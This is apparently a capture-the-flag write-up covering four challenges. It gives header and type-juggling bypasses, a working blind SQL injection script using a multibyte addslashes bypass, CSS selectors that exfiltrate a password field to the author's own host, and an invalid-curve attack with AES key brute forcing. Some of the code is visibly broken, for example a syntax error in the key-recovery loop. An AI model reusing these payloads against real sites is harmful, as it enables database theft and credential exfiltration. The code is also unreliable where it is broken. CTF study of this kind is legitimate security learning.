# SLINGSHOT

Set X-Forwarded-For header to 192.168.0.3.
Find backup.zip
Make request for user "abc" with password as array to bypass strcmp
Set uid cookie to 1xxx to bypass string compare, but intval will still return 1

# MISSION CONTROL
Password forgot site uses addslashes.
Use multi byte character %bf%27 to bypass adslashes
Dump database content via binary oracle (email sent or not)
Find table "safelogin", has binary data.
Content length isa multiple of 16, so probably AES ecnrypted
Since data is binary, probably AES_ENCRYPT was used
Recover query using the AES key by observing the table "information_schema.processlist"
Script that recovers the query, byte by byte (the WHERE clause makes sure, only queries with AES in them are recovered):

```python
import requests

baseurl = "http://gamebox3.reply.it/700ebc6abd298b14c34309fd85684a2b/forgot.php?action=1"

def req(payload):
# benutzername=admin&fertig=yes
    return requests.post(baseurl, data=payload,
        cookies={
        'PHPSESSID': 'inkiap6r4iptmbuabsic9p5j9p'
        },
        headers={
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0',
        'Referer': 'http://gamebox3.reply.it/700ebc6abd298b14c34309fd85684a2b/forgot.php?action=1',
        'Upgrade-Insecure-Requests': '1',
        }
    )
# print(req("benutzername=admin%bf%27 or 1 -- x&fertig=yes").text)

# hash admin: F0433D3C8B4ADA04D5E499154E158504
# hash g4lf:15EB32AF103F8F466E95577CA2C81BEBDD8938E34A6E5974BC04F3D09BECC2CA

answ = req("benutzername=admin%bf%27 or (SELECT SUBSTRING(info, 1, 7) from information_schema.processlist WHERE info like binary 0x254145535f444543525950542870617373776f72642c27563372794e6963334b3379546f5233633369763359307572466c346725 LIMIT 1)=0x53454c45435420  -- x&fertig=yes")

print("Password has been" in answ.text)
```

Script to aumotacically find the key:

```python
import requests

baseurl = "http://gamebox3.reply.it/700ebc6abd298b14c34309fd85684a2b/forgot.php?action=1"

def req(payload):
# benutzername=admin&fertig=yes
    return requests.post(baseurl, data=payload,
        cookies={
        'PHPSESSID': 'inkiap6r4iptmbuabsic9p5j9p'
        },
        headers={
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0',
        'Referer': 'http://gamebox3.reply.it/700ebc6abd298b14c34309fd85684a2b/forgot.php?action=1',
        'Upgrade-Insecure-Requests': '1',
        }
    )
# print(req("benutzername=admin%bf%27 or 1 -- x&fertig=yes").text)

# hash admin: F0433D3C8B4ADA04D5E499154E158504
# hash g4lf:15EB32AF103F8F466E95577CA2C81BEBDD8938E34A6E5974BC04F3D09BECC2CA

pw = ""

for row in range(1, 100):
    jump = 0
    for index in range(1, 65):
        for ascii in range(127):
            # answ = req("benutzername=admin%bf%27 or (SELECT ascii(SUBSTRING(hex(info), {}, 1)) from information_schema.processlist LIMIT 0,1)>{}  -- x&fertig=yes".format(index, ascii))
            hex_test = "%02x" % ascii
            answ = req("benutzername=admin%bf%27 or (SELECT SUBSTRING(info, 1, 6) from information_schema.processlist LIMIT 0,1)=0x53454c454354{}  -- x&fertig=yes".format(index, known_prefix += hex_test))
            # print("Password has been" in answ.text)
            # print(answ.text)
            if "Password has been" not in answ.text:
                if ascii == 0:
                    print("Skip row ", row)
                    jump = 1
                    break
                print(ascii)
                pw += chr(ascii)
                print("Password hash: ", pw)
                break
        if jump:
            break
```

Then decrypt with key V3ryNic3K3yToR3c3iv3Y0urFl4g via MySQL AES_DECRYPT.

# APOLLO
Straight forward CSS exfil as in https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense

Function to create the css selectors:

```python
def create_css(known):
    space = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-./:;<=>?@[\\]^_`' # "}" + string.ascii_uppercase + string.ascii_lowercase + "0123456789_:-{"
    res = """ 
    #PollContainer {
        background:url("http://rero.pw/container");
    }
    """
    for i in space:
        res += """#testPassword2[value$="{}{}"] {{
            background:url("http://rero.pw/?back={}{}");
        }}\n""".format(i, known, i, known)
    return res
```

Then notify admin and watch logs on rero.pw (our host).

# HIGH DREAMS

Parameters show that curve NIST P-256 is used. But given point is not on the curve.
So its an invalid curve approach.

Sage script to find the correct curve (different only in b parameter):

```



P = GF(0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF)
a = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFC
b = 0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B
x = 0xB70BF043C144935756F8F4578C369CF960EE510A5A0F90E93A373A21F0D1397F 
y = 0x4A2E0DED57A5156BB82EB4314C37FD4155395A7E51988AF289CCE531B9C17192

# find b

yf = P(y)
xf = P(x)

b_fake = yf**2 - xf**3 + 3*xf

print(b_fake)

# Fake curve
E = EllipticCurve(P, [a, int(b_fake)])
print(E)
# Generator
G = E(x, y)

print(E.order())

point_order = G.order()
for i in range(point_order + 1):
    print(i * G)
```

Curve point has only order of 5, so there are 5 possible keys.
Try all keys until a flag falls out:

```python
from Crypto.Cipher import AES, DES3, DES
import hashlib

vals = [
82794344854243450371984501721340198645022926339504713863786955730156937886079,
33552521881581467670836617859178523407344471948513881718969729275859461829010,
46111711714004764615393195350570532019484583409650937480110926637425134418118,
58716222405328743118080845934227278038278303558676945382860804917761871042597,
46111711714004764615393195350570532019484583409650937480110926637425134418118,
57075866805027505644616601015180295491807839856613368812672826391105226811354,
82794344854243450371984501721340198645022926339504713863786955730156937886079,
82239567328774781091860829090229050122741671466776432476563902033007636024941
]

ct = b"\x1a~\xf4\x81\x9e/&\x0b\xe78\xd5I.;V\x8f\x97\x96S\x83\x05\xea\xa7\x9d\xe1\xda\xb9F/7\x16\xa4s7Ti\xf26\x15+\x18\xf2\xc7\xbc%'\xc9j\xca\xc7b\x0cu?\x83Y\x8c\x0b\xe9\xd6\x97\xaa\xe1:\xdc\xf4k]D2\xf7\xe1\x8d\x84\x9azW\xe9\x93\x01\x81\x03\x81\xaf\xf25\x85!\xec\xb8\xd6&\xf7\x06|\xd0p\x00\xee\xa1+\\-\xf5\xe4\xa4\x17b\xc4\x12P\xed\x82X\xd6\x83=\xb5>\xee$.\x8eY\x16\x02\x07\x81W\xe1\x12\x85\xf5\xcd\xb8\x1d\xfc\x04|\x82\xca\x8cw\x14\x01\xfb\x97.\xe7\xb0\x98\x98\xfe\xc5vF\x1f\x92\xf1\xb6\xbf\xbdT\xdf\xeb2y\xa3b\x06\xaa\xe3\xef\xc6\x82\xc3U\r\xbdv$\xfe\xdb\xb90S\xde\xceg\x91\xb4\xb3U\xaa/\x940\xf7\xba0\xd1d{\x88\xb4\xd6\xbd4"

for v in vals:
    for par in ['big', 'little']:
        keym = int.to_bytes(v, 32, par)
        for off in range(2):
            for mode in [AES.MODE_ECB, AES.MODE_CBC, AES.MODE_OFB, AES.MODE_CFB]:
                key = keym
                key = keym[0 + 16*off:16+16*off]
                # key = hashlib.md5(keym).digest()
                print(key.hex())
                d = AES.new(keym, mode)
                dec = d.decrypt(ct)
                print(dec)
                open("outs/" + key.hex() + str(mode), "wb").write(dec)
```